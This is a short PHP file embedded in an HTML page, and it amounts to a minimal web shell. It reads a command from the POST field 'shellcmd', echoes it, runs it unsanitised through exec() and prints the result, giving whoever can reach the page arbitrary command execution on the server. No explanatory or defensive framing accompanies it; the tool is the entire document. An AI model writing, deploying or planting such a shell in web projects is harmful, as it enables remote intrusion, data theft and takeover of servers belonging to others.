<html>
<body>

<?php

$cmd = $_POST['shellcmd'];

echo "$cmd <br>";

$output = exec($cmd, $output);
echo "output $output <br>";


 ?>



</body>
</html>